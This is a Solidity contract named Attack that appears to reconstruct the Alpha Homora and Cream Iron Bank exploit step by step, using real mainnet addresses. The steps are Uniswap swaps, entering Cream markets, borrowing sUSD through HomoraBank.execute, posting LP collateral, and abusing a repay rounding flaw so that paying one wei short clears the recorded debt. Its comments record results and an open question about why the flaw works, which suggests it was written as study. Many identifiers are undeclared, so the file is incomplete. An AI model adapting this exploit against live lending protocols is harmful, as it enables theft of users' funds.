// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attack {
    HomoraBank public homorabank;

    constructor(address _homorabank) {
        homorabank = HomoraBank(_homorabank);
    }

    function attack1() external {
        // using uniswap to swap
        // uniswap address = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d，value = 0.5 ETH
        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            [
                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2, // WETH
                0x1f9840a85d5af5bf1d1762f925bdaddc4201f984 // UNI
            ],
            address(this),
            1613195981
        );

        // approve uniswap router
        unitoken.approve(address(uniSwapRouter), type(uint256).max);

        // add liquidity
        // function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline)
        uniSwapRouter.addLiquidityETH(
            0x1f9840a85d5af5bf1d1762f925bdaddc4201f984,
            39956169435440238768,
            1,
            1,
            address(this),
            1613195981
        );

        // enter markets in creamFinance
        /* 
            cySUSD = 0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8 
            cyDai = 0x8e595470Ed749b85C6F7669de83EAe304C2ec68F
            cyWETH = 0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393
            cyUSDT = 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a
            cyUSDC = 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c
        */
        creamFinancIronBank.enterMarkets(
            [
                0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8,
                0x8e595470ed749b85c6f7669de83eae304c2ec68f,
                0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393,
                0x48759f220ed983db51fa7a8c0d2aab8f3ce4166a,
                0x76eb2fe28b36b3ee97f3adae0c69606eedb2a37c
            ]
        );

        // curve = 0xa5407eae9ba41422680e2e00537571bcc53efbfd
        USDC.approve(address(curve), type(uint256).max);
        SUSD.approve(address(curve), type(uint256).max);
        DAI.approve(address(curve_aDAI_Pool), type(uint256).max);
        USDT.approve(address(curve_aDAI_Pool), type(uint256).max);
        USDC.approve(address(curve_aDAI_Pool), type(uint256).max);
        USDC.approve(address(AAVE_Lending_Pool), type(uint256).max);

        // swap ETH to sUSD， then have 912.639353999928927702 sUSD
        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            [
                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2, // WETH
                0x57ab1ec28d129707052df4df418d58a2d46d5f51 // sUSD
            ],
            address(this),
            1613195981
        );

        // using sUSD to mint to get cySUSD
        cySUSD.mint(894386566919930349147);
    }

    function attack3() external {
        bytes
            memory data = 0x0a22ceaa00000000000000000000000000000000000000000000000000000000000003e800000000000000000000000000000000000000000000000000000000;
        homorabank.execute(0, 0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2, data);
    }

    function execute3() external {
        // POSITION_ID = 883
        homorabank.POSITION_ID();

        // 0x57ab1ec28d129707052df4df418d58a2d46d5f51 =  sUSD , amount = 1000000000000000000000
        homorabank.borrow(
            0x57ab1ec28d129707052df4df418d58a2d46d5f51,
            1000000000000000000000
        );
        unilp.approve(WERC20);

        // use unilp to mint erc1155
        werc20.mint();

        //function putCollateral(address collToken, uint256 collId, uint256 amountCall)
        homorabank.putCollateral(
            0xe28d9df7718b0b5ba69e01073fe82254a9ed2f98,
            1209299932290980665713177030673858520201944054295,
            2265302661394052593
        );
    }

    /* the result will be */
    // collateralETHValue = 670838658434707390
    // getBorrowETHValue = 635983092500686978

    function attack4() external {
        //user call not contract
        bytes
            memory data = 0xe3b2ca9200000000000000000000000000000000000000000000000000000000;
        homorabank.execute(
            883,
            0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2,
            data
        );
    }

    function execute4() external {
        // cal interest，token is sUSD
        homorabank.accrue(0x57ab1ec28d129707052df4df418d58a2d46d5f51);

        // get debts，position id = 883
        // output: tokens[]，debts[1000000098548938710984], 1000.000098548938710984
        homorabank.getPositionDebts(883);

        // repay only 1000000098548938710983, but debt is 1000000098548938710984
        homorabank.repay(
            0x57ab1ec28d129707052df4df418d58a2d46d5f51,
            1000000098548938710983
        );

        /* the result will be */
        // collateralETHValue = 670838998176887290
        // getBorrowETHValue = 0 .
        // todo WHY? because repayInternal : paid.mul(totalShare).div(totalDebt)?
    }
}
